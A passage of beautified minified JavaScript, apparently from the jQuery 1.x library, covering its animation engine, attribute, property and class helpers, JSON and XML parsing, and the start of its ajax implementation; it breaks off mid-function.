    var lt, dt, ut, ct, ht, mt, ft, pt = /^(?:toggle|show|hide)$/, _t = new RegExp("^(?:([+-])=|)(" + B + ")([a-z%]*)$","i"), gt = /queueHooks$/, yt = [function(t, e, n) {
        var i, a, s, r, o, l, d, u, c = this, h = {}, m = t.style, f = t.nodeType && $(t), p = k._data(t, "fxshow");
        for (i in n.queue || (null == (o = k._queueHooks(t, "fx")).unqueued && (o.unqueued = 0,
        l = o.empty.fire,
        o.empty.fire = function() {
            o.unqueued || l()
        }
        ),
        o.unqueued++,
        c.always(function() {
            c.always(function() {
                o.unqueued--,
                k.queue(t, "fx").length || o.empty.fire()
            })
        })),
        1 === t.nodeType && ("height"in e || "width"in e) && (n.overflow = [m.overflow, m.overflowX, m.overflowY],
        d = k.css(t, "display"),
        u = je(t.nodeName),
        "none" === d && (d = u),
        "inline" === d && "none" === k.css(t, "float") && (g.inlineBlockNeedsLayout && "inline" !== u ? m.zoom = 1 : m.display = "inline-block")),
        n.overflow && (m.overflow = "hidden",
        g.shrinkWrapBlocks() || c.always(function() {
            m.overflow = n.overflow[0],
            m.overflowX = n.overflow[1],
            m.overflowY = n.overflow[2]
        })),
        e)
            if (a = e[i],
            pt.exec(a)) {
                if (delete e[i],
                s = s || "toggle" === a,
                a === (f ? "hide" : "show")) {
                    if ("show" !== a || !p || void 0 === p[i])
                        continue;
                    f = !0
                }
                h[i] = p && p[i] || k.style(t, i)
            }
        if (!k.isEmptyObject(h))
            for (i in p ? "hidden"in p && (f = p.hidden) : p = k._data(t, "fxshow", {}),
            s && (p.hidden = !f),
            f ? k(t).show() : c.done(function() {
                k(t).hide()
            }),
            c.done(function() {
                var e;
                for (e in k._removeData(t, "fxshow"),
                h)
                    k.style(t, e, h[e])
            }),
            h)
                r = bt(f ? p[i] : 0, i, c),
                i in p || (p[i] = r.start,
                f && (r.end = r.start,
                r.start = "width" === i || "height" === i ? 1 : 0))
    }
    ], vt = {
        "*": [function(e, t) {
            var n = this.createTween(e, t)
              , i = n.cur()
              , a = _t.exec(t)
              , s = a && a[3] || (k.cssNumber[e] ? "" : "px")
              , r = (k.cssNumber[e] || "px" !== s && +i) && _t.exec(k.css(n.elem, e))
              , o = 1
              , l = 20;
            if (r && r[3] !== s)
                for (s = s || r[3],
                a = a || [],
                r = +i || 1; r /= o = o || ".5",
                k.style(n.elem, e, r + s),
                o !== (o = n.cur() / i) && 1 !== o && --l; )
                    ;
            return a && (r = n.start = +r || +i || 0,
            n.unit = s,
            n.end = a[1] ? r + (a[1] + 1) * a[2] : +a[2]),
            n
        }
        ]
    };
    function Mt() {
        return setTimeout(function() {
            lt = void 0
        }),
        lt = k.now()
    }
    function Lt(e, t) {
        var n, i = {
            height: e
        }, a = 0;
        for (t = t ? 1 : 0; a < 4; a += 2 - t)
            i["margin" + (n = q[a])] = i["padding" + n] = e;
        return t && (i.opacity = i.width = e),
        i
    }
    function bt(e, t, n) {
        for (var i, a = (vt[t] || []).concat(vt["*"]), s = 0, r = a.length; s < r; s++)
            if (i = a[s].call(n, t, e))
                return i
    }
    function kt(s, e, t) {
        var n, r, i = 0, a = yt.length, o = k.Deferred().always(function() {
            delete l.elem
        }), l = function() {
            if (r)
                return !1;
            for (var e = lt || Mt(), t = Math.max(0, d.startTime + d.duration - e), n = 1 - (t / d.duration || 0), i = 0, a = d.tweens.length; i < a; i++)
                d.tweens[i].run(n);
            return o.notifyWith(s, [d, n, t]),
            n < 1 && a ? t : (o.resolveWith(s, [d]),
            !1)
        }, d = o.promise({
            elem: s,
            props: k.extend({}, e),
            opts: k.extend(!0, {
                specialEasing: {}
            }, t),
            originalProperties: e,
            originalOptions: t,
            startTime: lt || Mt(),
            duration: t.duration,
            tweens: [],
            createTween: function(e, t) {
                var n = k.Tween(s, d.opts, e, t, d.opts.specialEasing[e] || d.opts.easing);
                return d.tweens.push(n),
                n
            },
            stop: function(e) {
                var t = 0
                  , n = e ? d.tweens.length : 0;
                if (r)
                    return this;
                for (r = !0; t < n; t++)
                    d.tweens[t].run(1);
                return e ? o.resolveWith(s, [d, e]) : o.rejectWith(s, [d, e]),
                this
            }
        }), u = d.props;
        for (function(e, t) {
            var n, i, a, s, r;
            for (n in e)
                if (a = t[i = k.camelCase(n)],
                s = e[n],
                k.isArray(s) && (a = s[1],
                s = e[n] = s[0]),
                n !== i && (e[i] = s,
                delete e[n]),
                (r = k.cssHooks[i]) && "expand"in r)
                    for (n in s = r.expand(s),
                    delete e[i],
                    s)
                        n in e || (e[n] = s[n],
                        t[n] = a);
                else
                    t[i] = a
        }(u, d.opts.specialEasing); i < a; i++)
            if (n = yt[i].call(d, s, u, d.opts))
                return n;
        return k.map(u, bt, d),
        k.isFunction(d.opts.start) && d.opts.start.call(s, d),
        k.fx.timer(k.extend(l, {
            elem: s,
            anim: d,
            queue: d.opts.queue
        })),
        d.progress(d.opts.progress).done(d.opts.done, d.opts.complete).fail(d.opts.fail).always(d.opts.always)
    }
    k.Animation = k.extend(kt, {
        tweener: function(e, t) {
            for (var n, i = 0, a = (e = k.isFunction(e) ? (t = e,
            ["*"]) : e.split(" ")).length; i < a; i++)
                n = e[i],
                vt[n] = vt[n] || [],
                vt[n].unshift(t)
        },
        prefilter: function(e, t) {
            t ? yt.unshift(e) : yt.push(e)
        }
    }),
    k.speed = function(e, t, n) {
        var i = e && "object" == typeof e ? k.extend({}, e) : {
            complete: n || !n && t || k.isFunction(e) && e,
            duration: e,
            easing: n && t || t && !k.isFunction(t) && t
        };
        return i.duration = k.fx.off ? 0 : "number" == typeof i.duration ? i.duration : i.duration in k.fx.speeds ? k.fx.speeds[i.duration] : k.fx.speeds._default,
        null != i.queue && !0 !== i.queue || (i.queue = "fx"),
        i.old = i.complete,
        i.complete = function() {
            k.isFunction(i.old) && i.old.call(this),
            i.queue && k.dequeue(this, i.queue)
        }
        ,
        i
    }
    ,
    k.fn.extend({
        fadeTo: function(e, t, n, i) {
            return this.filter($).css("opacity", 0).show().end().animate({
                opacity: t
            }, e, n, i)
        },
        animate: function(t, e, n, i) {
            function a() {
                var e = kt(this, k.extend({}, t), r);
                (s || k._data(this, "finish")) && e.stop(!0)
            }
            var s = k.isEmptyObject(t)
              , r = k.speed(e, n, i);
            return a.finish = a,
            s || !1 === r.queue ? this.each(a) : this.queue(r.queue, a)
        },
        stop: function(a, e, s) {
            function r(e) {
                var t = e.stop;
                delete e.stop,
                t(s)
            }
            return "string" != typeof a && (s = e,
            e = a,
            a = void 0),
            e && !1 !== a && this.queue(a || "fx", []),
            this.each(function() {
                var e = !0
                  , t = null != a && a + "queueHooks"
                  , n = k.timers
                  , i = k._data(this);
                if (t)
                    i[t] && i[t].stop && r(i[t]);
                else
                    for (t in i)
                        i[t] && i[t].stop && gt.test(t) && r(i[t]);
                for (t = n.length; t--; )
                    n[t].elem !== this || null != a && n[t].queue !== a || (n[t].anim.stop(s),
                    e = !1,
                    n.splice(t, 1));
                !e && s || k.dequeue(this, a)
            })
        },
        finish: function(r) {
            return !1 !== r && (r = r || "fx"),
            this.each(function() {
                var e, t = k._data(this), n = t[r + "queue"], i = t[r + "queueHooks"], a = k.timers, s = n ? n.length : 0;
                for (t.finish = !0,
                k.queue(this, r, []),
                i && i.stop && i.stop.call(this, !0),
                e = a.length; e--; )
                    a[e].elem === this && a[e].queue === r && (a[e].anim.stop(!0),
                    a.splice(e, 1));
                for (e = 0; e < s; e++)
                    n[e] && n[e].finish && n[e].finish.call(this);
                delete t.finish
            })
        }
    }),
    k.each(["toggle", "show", "hide"], function(e, i) {
        var a = k.fn[i];
        k.fn[i] = function(e, t, n) {
            return null == e || "boolean" == typeof e ? a.apply(this, arguments) : this.animate(Lt(i, !0), e, t, n)
        }
    }),
    k.each({
        slideDown: Lt("show"),
        slideUp: Lt("hide"),
        slideToggle: Lt("toggle"),
        fadeIn: {
            opacity: "show"
        },
        fadeOut: {
            opacity: "hide"
        },
        fadeToggle: {
            opacity: "toggle"
        }
    }, function(e, i) {
        k.fn[e] = function(e, t, n) {
            return this.animate(i, e, t, n)
        }
    }),
    k.timers = [],
    k.fx.tick = function() {
        var e, t = k.timers, n = 0;
        for (lt = k.now(); n < t.length; n++)
            (e = t[n])() || t[n] !== e || t.splice(n--, 1);
        t.length || k.fx.stop(),
        lt = void 0
    }
    ,
    k.fx.timer = function(e) {
        k.timers.push(e),
        e() ? k.fx.start() : k.timers.pop()
    }
    ,
    k.fx.interval = 13,
    k.fx.start = function() {
        dt = dt || setInterval(k.fx.tick, k.fx.interval)
    }
    ,
    k.fx.stop = function() {
        clearInterval(dt),
        dt = null
    }
    ,
    k.fx.speeds = {
        slow: 600,
        fast: 200,
        _default: 400
    },
    k.fn.delay = function(i, e) {
        return i = k.fx && k.fx.speeds[i] || i,
        e = e || "fx",
        this.queue(e, function(e, t) {
            var n = setTimeout(e, i);
            t.stop = function() {
                clearTimeout(n)
            }
        })
    }
    ,
    (ft = Y.createElement("div")).setAttribute("className", "t"),
    ft.innerHTML = "  <link/><table></table><a href='/a'>a</a><input type='checkbox'/>",
    ut = ft.getElementsByTagName("a")[0],
    mt = (ht = Y.createElement("select")).appendChild(Y.createElement("option")),
    ct = ft.getElementsByTagName("input")[0],
    ut.style.cssText = "top:1px",
    g.getSetAttribute = "t" !== ft.className,
    g.style = /top/.test(ut.getAttribute("style")),
    g.hrefNormalized = "/a" === ut.getAttribute("href"),
    g.checkOn = !!ct.value,
    g.optSelected = mt.selected,
    g.enctype = !!Y.createElement("form").enctype,
    ht.disabled = !0,
    g.optDisabled = !mt.disabled,
    (ct = Y.createElement("input")).setAttribute("value", ""),
    g.input = "" === ct.getAttribute("value"),
    ct.value = "t",
    ct.setAttribute("type", "radio"),
    g.radioValue = "t" === ct.value,
    ut = ct = ht = mt = ft = null;
    var Dt = /\r/g;
    k.fn.extend({
        val: function(n) {
            var i, e, a, t = this[0];
            return arguments.length ? (a = k.isFunction(n),
            this.each(function(e) {
                var t;
                1 === this.nodeType && (null == (t = a ? n.call(this, e, k(this).val()) : n) ? t = "" : "number" == typeof t ? t += "" : k.isArray(t) && (t = k.map(t, function(e) {
                    return null == e ? "" : e + ""
                })),
                (i = k.valHooks[this.type] || k.valHooks[this.nodeName.toLowerCase()]) && "set"in i && void 0 !== i.set(this, t, "value") || (this.value = t))
            })) : t ? (i = k.valHooks[t.type] || k.valHooks[t.nodeName.toLowerCase()]) && "get"in i && void 0 !== (e = i.get(t, "value")) ? e : "string" == typeof (e = t.value) ? e.replace(Dt, "") : null == e ? "" : e : void 0
        }
    }),
    k.extend({
        valHooks: {
            option: {
                get: function(e) {
                    var t = k.find.attr(e, "value");
                    return null != t ? t : k.text(e)
                }
            },
            select: {
                get: function(e) {
                    for (var t, n, i = e.options, a = e.selectedIndex, s = "select-one" === e.type || a < 0, r = s ? null : [], o = s ? a + 1 : i.length, l = a < 0 ? o : s ? a : 0; l < o; l++)
                        if (!(!(n = i[l]).selected && l !== a || (g.optDisabled ? n.disabled : null !== n.getAttribute("disabled")) || n.parentNode.disabled && k.nodeName(n.parentNode, "optgroup"))) {
                            if (t = k(n).val(),
                            s)
                                return t;
                            r.push(t)
                        }
                    return r
                },
                set: function(e, t) {
                    for (var n, i, a = e.options, s = k.makeArray(t), r = a.length; r--; )
                        if (i = a[r],
                        0 <= k.inArray(k.valHooks.option.get(i), s))
                            try {
                                i.selected = n = !0
                            } catch (e) {
                                i.scrollHeight
                            }
                        else
                            i.selected = !1;
                    return n || (e.selectedIndex = -1),
                    a
                }
            }
        }
    }),
    k.each(["radio", "checkbox"], function() {
        k.valHooks[this] = {
            set: function(e, t) {
                return k.isArray(t) ? e.checked = 0 <= k.inArray(k(e).val(), t) : void 0
            }
        },
        g.checkOn || (k.valHooks[this].get = function(e) {
            return null === e.getAttribute("value") ? "on" : e.value
        }
        )
    });
    var Yt, wt, Tt = k.expr.attrHandle, St = /^(?:checked|selected)$/i, xt = g.getSetAttribute, Ht = g.input;
    k.fn.extend({
        attr: function(e, t) {
            return U(this, k.attr, e, t, 1 < arguments.length)
        },
        removeAttr: function(e) {
            return this.each(function() {
                k.removeAttr(this, e)
            })
        }
    }),
    k.extend({
        attr: function(e, t, n) {
            var i, a, s = e.nodeType;
            if (e && 3 !== s && 8 !== s && 2 !== s)
                return typeof e.getAttribute === O ? k.prop(e, t, n) : (1 === s && k.isXMLDoc(e) || (t = t.toLowerCase(),
                i = k.attrHooks[t] || (k.expr.match.bool.test(t) ? wt : Yt)),
                void 0 === n ? i && "get"in i && null !== (a = i.get(e, t)) ? a : null == (a = k.find.attr(e, t)) ? void 0 : a : null !== n ? i && "set"in i && void 0 !== (a = i.set(e, n, t)) ? a : (e.setAttribute(t, n + ""),
                n) : void k.removeAttr(e, t))
        },
        removeAttr: function(e, t) {
            var n, i, a = 0, s = t && t.match(E);
            if (s && 1 === e.nodeType)
                for (; n = s[a++]; )
                    i = k.propFix[n] || n,
                    k.expr.match.bool.test(n) ? Ht && xt || !St.test(n) ? e[i] = !1 : e[k.camelCase("default-" + n)] = e[i] = !1 : k.attr(e, n, ""),
                    e.removeAttribute(xt ? n : i)
        },
        attrHooks: {
            type: {
                set: function(e, t) {
                    if (!g.radioValue && "radio" === t && k.nodeName(e, "input")) {
                        var n = e.value;
                        return e.setAttribute("type", t),
                        n && (e.value = n),
                        t
                    }
                }
            }
        }
    }),
    wt = {
        set: function(e, t, n) {
            return !1 === t ? k.removeAttr(e, n) : Ht && xt || !St.test(n) ? e.setAttribute(!xt && k.propFix[n] || n, n) : e[k.camelCase("default-" + n)] = e[n] = !0,
            n
        }
    },
    k.each(k.expr.match.bool.source.match(/\w+/g), function(e, t) {
        var s = Tt[t] || k.find.attr;
        Tt[t] = Ht && xt || !St.test(t) ? function(e, t, n) {
            var i, a;
            return n || (a = Tt[t],
            Tt[t] = i,
            i = null != s(e, t, n) ? t.toLowerCase() : null,
            Tt[t] = a),
            i
        }
        : function(e, t, n) {
            return n ? void 0 : e[k.camelCase("default-" + t)] ? t.toLowerCase() : null
        }
    }),
    Ht && xt || (k.attrHooks.value = {
        set: function(e, t, n) {
            return k.nodeName(e, "input") ? void (e.defaultValue = t) : Yt && Yt.set(e, t, n)
        }
    }),
    xt || (Yt = {
        set: function(e, t, n) {
            var i = e.getAttributeNode(n);
            return i || e.setAttributeNode(i = e.ownerDocument.createAttribute(n)),
            i.value = t += "",
            "value" === n || t === e.getAttribute(n) ? t : void 0
        }
    },
    Tt.id = Tt.name = Tt.coords = function(e, t, n) {
        var i;
        return n ? void 0 : (i = e.getAttributeNode(t)) && "" !== i.value ? i.value : null
    }
    ,
    k.valHooks.button = {
        get: function(e, t) {
            var n = e.getAttributeNode(t);
            return n && n.specified ? n.value : void 0
        },
        set: Yt.set
    },
    k.attrHooks.contenteditable = {
        set: function(e, t, n) {
            Yt.set(e, "" !== t && t, n)
        }
    },
    k.each(["width", "height"], function(e, n) {
        k.attrHooks[n] = {
            set: function(e, t) {
                return "" === t ? (e.setAttribute(n, "auto"),
                t) : void 0
            }
        }
    })),
    g.style || (k.attrHooks.style = {
        get: function(e) {
            return e.style.cssText || void 0
        },
        set: function(e, t) {
            return e.style.cssText = t + ""
        }
    });
    var Et = /^(?:input|select|textarea|button|object)$/i
      , jt = /^(?:a|area)$/i;
    k.fn.extend({
        prop: function(e, t) {
            return U(this, k.prop, e, t, 1 < arguments.length)
        },
        removeProp: function(e) {
            return e = k.propFix[e] || e,
            this.each(function() {
                try {
                    this[e] = void 0,
                    delete this[e]
                } catch (e) {}
            })
        }
    }),
    k.extend({
        propFix: {
            for: "htmlFor",
            class: "className"
        },
        prop: function(e, t, n) {
            var i, a, s = e.nodeType;
            if (e && 3 !== s && 8 !== s && 2 !== s)
                return (1 !== s || !k.isXMLDoc(e)) && (t = k.propFix[t] || t,
                a = k.propHooks[t]),
                void 0 !== n ? a && "set"in a && void 0 !== (i = a.set(e, n, t)) ? i : e[t] = n : a && "get"in a && null !== (i = a.get(e, t)) ? i : e[t]
        },
        propHooks: {
            tabIndex: {
                get: function(e) {
                    var t = k.find.attr(e, "tabindex");
                    return t ? parseInt(t, 10) : Et.test(e.nodeName) || jt.test(e.nodeName) && e.href ? 0 : -1
                }
            }
        }
    }),
    g.hrefNormalized || k.each(["href", "src"], function(e, t) {
        k.propHooks[t] = {
            get: function(e) {
                return e.getAttribute(t, 4)
            }
        }
    }),
    g.optSelected || (k.propHooks.selected = {
        get: function(e) {
            var t = e.parentNode;
            return t && (t.selectedIndex,
            t.parentNode && t.parentNode.selectedIndex),
            null
        }
    }),
    k.each(["tabIndex", "readOnly", "maxLength", "cellSpacing", "cellPadding", "rowSpan", "colSpan", "useMap", "frameBorder", "contentEditable"], function() {
        k.propFix[this.toLowerCase()] = this
    }),
    g.enctype || (k.propFix.enctype = "encoding");
    var Ct = /[\t\r\n\f]/g;
    k.fn.extend({
        addClass: function(t) {
            var e, n, i, a, s, r, o = 0, l = this.length, d = "string" == typeof t && t;
            if (k.isFunction(t))
                return this.each(function(e) {
                    k(this).addClass(t.call(this, e, this.className))
                });
            if (d)
                for (e = (t || "").match(E) || []; o < l; o++)
                    if (i = 1 === (n = this[o]).nodeType && (n.className ? (" " + n.className + " ").replace(Ct, " ") : " ")) {
                        for (s = 0; a = e[s++]; )
                            i.indexOf(" " + a + " ") < 0 && (i += a + " ");
                        r = k.trim(i),
                        n.className !== r && (n.className = r)
                    }
            return this
        },
        removeClass: function(t) {
            var e, n, i, a, s, r, o = 0, l = this.length, d = 0 === arguments.length || "string" == typeof t && t;
            if (k.isFunction(t))
                return this.each(function(e) {
                    k(this).removeClass(t.call(this, e, this.className))
                });
            if (d)
                for (e = (t || "").match(E) || []; o < l; o++)
                    if (i = 1 === (n = this[o]).nodeType && (n.className ? (" " + n.className + " ").replace(Ct, " ") : "")) {
                        for (s = 0; a = e[s++]; )
                            for (; 0 <= i.indexOf(" " + a + " "); )
                                i = i.replace(" " + a + " ", " ");
                        r = t ? k.trim(i) : "",
                        n.className !== r && (n.className = r)
                    }
            return this
        },
        toggleClass: function(a, t) {
            var s = typeof a;
            return "boolean" == typeof t && "string" == s ? t ? this.addClass(a) : this.removeClass(a) : this.each(k.isFunction(a) ? function(e) {
                k(this).toggleClass(a.call(this, e, this.className, t), t)
            }
            : function() {
                if ("string" == s)
                    for (var e, t = 0, n = k(this), i = a.match(E) || []; e = i[t++]; )
                        n.hasClass(e) ? n.removeClass(e) : n.addClass(e);
                else
                    s !== O && "boolean" != s || (this.className && k._data(this, "__className__", this.className),
                    this.className = !this.className && !1 !== a && k._data(this, "__className__") || "")
            }
            )
        },
        hasClass: function(e) {
            for (var t = " " + e + " ", n = 0, i = this.length; n < i; n++)
                if (1 === this[n].nodeType && 0 <= (" " + this[n].className + " ").replace(Ct, " ").indexOf(t))
                    return !0;
            return !1
        }
    }),
    k.each("blur focus focusin focusout load resize scroll unload click dblclick mousedown mouseup mousemove mouseover mouseout mouseenter mouseleave change select submit keydown keypress keyup error contextmenu".split(" "), function(e, n) {
        k.fn[n] = function(e, t) {
            return 0 < arguments.length ? this.on(n, null, e, t) : this.trigger(n)
        }
    }),
    k.fn.extend({
        hover: function(e, t) {
            return this.mouseenter(e).mouseleave(t || e)
        },
        bind: function(e, t, n) {
            return this.on(e, null, t, n)
        },
        unbind: function(e, t) {
            return this.off(e, null, t)
        },
        delegate: function(e, t, n, i) {
            return this.on(t, e, n, i)
        },
        undelegate: function(e, t, n) {
            return 1 === arguments.length ? this.off(e, "**") : this.off(t, e || "**", n)
        }
    });
    var At = k.now()
      , Pt = /\?/
      , Ot = /(,)|(\[|{)|(}|])|"(?:[^"\\\r\n]|\\["\\\/bfnrt]|\\u[\da-fA-F]{4})*"\s*:?|true|false|null|-?(?!0\d)\d+(?:\.\d+|)(?:[eE][+-]?\d+|)/g;
    k.parseJSON = function(e) {
        if (f.JSON && f.JSON.parse)
            return f.JSON.parse(e + "");
        var a, s = null, t = k.trim(e + "");
        return t && !k.trim(t.replace(Ot, function(e, t, n, i) {
            return a && t && (s = 0),
            0 === s ? e : (a = n || t,
            s += !i - !n,
            "")
        })) ? Function("return " + t)() : k.error("Invalid JSON: " + e)
    }
    ,
    k.parseXML = function(e) {
        var t;
        if (!e || "string" != typeof e)
            return null;
        try {
            f.DOMParser ? t = (new DOMParser).parseFromString(e, "text/xml") : ((t = new ActiveXObject("Microsoft.XMLDOM")).async = "false",
            t.loadXML(e))
        } catch (e) {
            t = void 0
        }
        return t && t.documentElement && !t.getElementsByTagName("parsererror").length || k.error("Invalid XML: " + e),
        t
    }
    ;
    var Nt, Ft, Wt = /#.*$/, It = /([?&])_=[^&]*/, zt = /^(.*?):[ \t]*([^\r\n]*)\r?$/gm, Rt = /^(?:GET|HEAD)$/, $t = /^\/\//, Bt = /^([\w.+-]+:)(?:\/\/(?:[^\/?#]*@|)([^\/?#:]*)(?::(\d+)|)|)/, qt = {}, Ut = {}, Jt = "*/".concat("*");
    try {
        Ft = location.href
    } catch (e) {
        (Ft = Y.createElement("a")).href = "",
        Ft = Ft.href
    }
    function Vt(s) {
        return function(e, t) {
            "string" != typeof e && (t = e,
            e = "*");
            var n, i = 0, a = e.toLowerCase().match(E) || [];
            if (k.isFunction(t))
                for (; n = a[i++]; )
                    "+" === n.charAt(0) ? (n = n.slice(1) || "*",
                    (s[n] = s[n] || []).unshift(t)) : (s[n] = s[n] || []).push(t)
        }
    }
    function Gt(t, a, s, r) {
        var o = {}
          , l = t === Ut;
        function d(e) {
            var i;
            return o[e] = !0,
            k.each(t[e] || [], function(e, t) {
                var n = t(a, s, r);
                return "string" != typeof n || l || o[n] ? l ? !(i = n) : void 0 : (a.dataTypes.unshift(n),
                d(n),
                !1)
            }),
            i
        }
        return d(a.dataTypes[0]) || !o["*"] && d("*")
    }
    function Xt(e, t) {
        var n, i, a = k.ajaxSettings.flatOptions || {};
        for (i in t)
            void 0 !== t[i] && ((a[i] ? e : n = n || {})[i] = t[i]);
        return n && k.extend(!0, e, n),
        e
    }
    Nt = Bt.exec(Ft.toLowerCase()) || [],
    k.extend({
        active: 0,
        lastModified: {},
        etag: {},
        ajaxSettings: {
            url: Ft,
            type: "GET",
            isLocal: /^(?:about|app|app-storage|.+-extension|file|res|widget):$/.test(Nt[1]),
            global: !0,
            processData: !0,
            async: !0,
            contentType: "application/x-www-form-urlencoded; charset=UTF-8",
            accepts: {
                "*": Jt,
                text: "text/plain",
                html: "text/html",
                xml: "application/xml, text/xml",
                json: "application/json, text/javascript"
            },
            contents: {
                xml: /xml/,
                html: /html/,
                json: /json/
            },
            responseFields: {
                xml: "responseXML",
                text: "responseText",
                json: "responseJSON"
            },
            converters: {
                "* text": String,
                "text html": !0,
                "text json": k.parseJSON,
                "text xml": k.parseXML
            },
            flatOptions: {
                url: !0,
                context: !0
            }
        },
        ajaxSetup: function(e, t) {
            return t ? Xt(Xt(e, k.ajaxSettings), t) : Xt(k.ajaxSettings, e)
        },
        ajaxPrefilter: Vt(qt),
        ajaxTransport: Vt(Ut),
        ajax: function(e, t) {
            "object" == typeof e && (t = e,
            e = void 0),
            t = t || {};
            var n, i, u, c, h, m, f, a, p = k.ajaxSetup({}, t), _ = p.context || p, g = p.context && (_.nodeType || _.jquery) ? k(_) : k.event, y = k.Deferred(), v = k.Callbacks("once memory"), M = p.statusCode || {}, s = {}, r = {}, L = 0, o = "canceled", b = {
                readyState: 0,
                getResponseHeader: function(e) {
                    var t;
                    if (2 === L) {
                        if (!a)
                            for (a = {}; t = zt.exec(c); )
                                a[t[1].toLowerCase()] = t[2];
                        t = a[e.toLowerCase()]
                    }
                    return null == t ? null : t
                },
                getAllResponseHeaders: function() {
                    return 2 === L ? c : null
                },
                setRequestHeader: function(e, t) {
                    var n = e.toLowerCase();
                    return L || (e = r[n] = r[n] || e,
                    s[e] = t),
                    this
                },
                overrideMimeType: function(e) {
                    return L || (p.mimeType = e),
                    this
                },
                statusCode: function(e) {
                    var t;
                    if (e)
                        if (L < 2)
                            for (t in e)
                                M[t] = [M[t], e[t]];
                        else
                            b.always(e[b.status]);
                    return this
                },
                abort: function(e) {
                    var t = e || o;
                    return f && f.abort(t),
                    l(0, t),
                    this
                }
            };
            if (y.promise(b).complete = v.add,
            b.success = b.done,
            b.error = b.fail,
            p.url = ((e || p.url || Ft) + "").replace(Wt, "").replace($t, Nt[1] + "//"),
            p.type = t.method || t.type || p.method || p.type,
            p.dataTypes = k.trim(p.dataType || "*").toLowerCase().match(E) || [""],
            null == p.crossDomain && (n = Bt.exec(p.url.toLowerCase()),
            p.crossDomain = !(!n || n[1] === Nt[1] && n[2] === Nt[2] && (n[3] || ("http:" === n[1] ? "80" : "443")) === (Nt[3] || ("http:" === Nt[1] ? "80" : "443")))),
            p.data && p.processData && "string" != typeof p.data && (p.data = k.param(p.data, p.traditional)),
            Gt(qt, p, t, b),
            2 === L)
                return b;
            for (i in (m = p.global) && 0 == k.active++ && k.event.trigger("ajaxStart"),
            p.type = p.type.toUpperCase(),
            p.hasContent = !Rt.test(p.type),
            u = p.url,
            p.hasContent || (p.data && (u = p.url += (Pt.test(u) ? "&" : "?") + p.data,
            delete p.data),
            !1 === p.cache && (p.url = It.test(u) ? u.replace(It, "$1_=" + At++) : u + (Pt.test(u) ? "&" : "?") + "_=" + At++)),
            p.ifModified && (k.lastModified[u] && b.setRequestHeader("If-Modified-Since", k.lastModified[u]),
            k.etag[u] && b.setRequestHeader("If-None-Match", k.etag[u])),
            (p.data && p.hasContent && !1 !== p.contentType || t.contentType) && b.setRequestHeader("Content-Type", p.contentType),
            b.setRequestHeader("Accept", p.dataTypes[0] && p.accepts[p.dataTypes[0]] ? p.accepts[p.dataTypes[0]] + ("*" !== p.dataTypes[0] ? ", " + Jt + "; q=0.01" : "") : p.accepts["*"]),
            p.headers)
                b.setRequestHeader(i, p.headers[i]);
            if (p.beforeSend && (!1 === p.beforeSend.call(_, b, p) || 2 === L))
                return b.abort();
            for (i in o = "abort",
            {
                success: 1,
                error: 1,
                complete: 1
            })
                b[i](p[i]);
            if (f = Gt(Ut, p, t, b)) {
                b.readyState = 1,
                m && g.trigger("ajaxSend", [b, p]),
                p.async && 0 < p.timeout && (h = setTimeout(function() {
                    b.abort("timeout")
                }, p.timeout));
                try {
                    L = 1,
                    f.send(s, l)
                } catch (e) {
                    if (!(L < 2))
                        throw e;
                    l(-1, e)
                }
            } else
                l(-1, "No Transport");
            function l(e, t, n, i) {
                var a, s, r, o, l, d = t;
                2 !== L && (L = 2,
                h && clearTimeout(h),
                f = void 0,
                c = i || "",
                b.readyState = 0 < e ? 4 : 0,
                a = 200 <= e && e < 300 || 304 === e,
                n && (o = function(e, t, n) {
                    for (var i, a, s, r, o = e.contents, l = e.dataTypes; "*" === l[0]; )
                        l.shift(),
                        void 0 === a && (a = e.mimeType || t.getResponseHeader("Content-Type"));
                    if (a)
                        for (r in o)
                            if (o[r] && o[r].test(a)) {
                                l.unshift(r);
                                break
                            }
                    if (l[0]in n)
                        s = l[0];
                    else {
                        for (r in n) {
                            if (!l[0] || e.converters[r + " " + l[0]]) {
                                s = r;
                                break
                            }
                            i = i || r
                        }
                        s = s || i
                    }
                    return s ? (s !== l[0] && l.unshift(s),
                    n[s]) : void 0
                }(p, b, n)),
                o = function(e, t, n, i) {
                    var a, s, r, o, l, d = {}, u = e.dataTypes.slice();
                    if (u[1])
                        for (r in e.converters)
                            d[r.toLowerCase()] = e.converters[r];
                    for (s = u.shift(); s; )
                        if (e.responseFields[s] && (n[e.responseFields[s]] = t),
                        !l && i && e.dataFilter && (t = e.dataFilter(t, e.dataType)),
                        l = s,
                        s = u.shift())
                            if ("*" === s)
                                s = l;
                            else if ("*" !== l && l !== s) {
                                if (!(r = d[l + " " + s] || d["* " + s]))
                                    for (a in d)
                                        if ((o = a.split(" "))[1] === s && (r = d[l + " " + o[0]] || d["* " + o[0]])) {
                                            !0 === r ? r = d[a] : !0 !== d[a] && (s = o[0],
                                            u.unshift(o[1]));
                                            break
                                        }
                                if (!0 !== r)
                                    if (r && e.throws)
                                        t = r(t);
                                    else
                                        try {
                                            t = r(t)
                                        } catch (e) {
                                            return {
                                                state: "parsererror",
                                                error: r ? e : "No conversion from " + l + " to " + s
                                            }
                                        }
                            }
                    return {
                        state: "success",
                        data: t
                    }
                }(p, o, b, a),
                a ? (p.ifModified && ((l = b.getResponseHeader("Last-Modified")) && (k.lastModified[u] = l),
                (l = b.getResponseHeader("etag")) && (k.etag[u] = l)),
                204 === e || "HEAD" === p.type ? d = "nocontent" : 304 === e ? d = "notmodified" : (d = o.state,
                s = o.data,
                a = !(r = o.error))) : (r = d,
                !e && d || (d = "error",
                e < 0 && (e = 0))),
                b.status = e,
                b.statusText = (t || d) + "",
                a ? y.resolveWith(_, [s, d, b]) : y.rejectWith(_, [b, d, r]),
                b.statusCode(M),
                M = void 0,
                m && g.trigger(a ? "ajaxSuccess" : "ajaxError", [b, p, a ? s : r]),
                v.fireWith(_, [b, d]),
                m && (g.trigger("ajaxComplete", [b, p]),
                --k.active || k.event.trigger("ajaxStop")))
            }
            return b
        },
        getJSON: function(e, t, n) {
            return k.get(e, t, n, "json")
        },
        getScript: function(e, t) {
            return k.get(e, void 0, t, "script")
        }
    }),
    k.each(["get", "post"], function(e, a) {
        k[a] = function(e, t, n, i) {
            return k.isFunction(t) && (i = i || n,
            n = t,
            t = void 0),
            k.ajax({
                url: e,
                type: a,
                dataType: i,
                data: t,
                success: n
            })
        }
    }),
    k.each(["ajaxStart", "ajaxStop", "ajaxComplete", "ajaxError", "ajaxSuccess", "ajaxSend"], function(e, t) {
        k.fn[t] = function(e) {
            return this.on(t, e)
        }
    }),
    k._evalUrl = function(e) {
        return k.ajax({
            url: e,
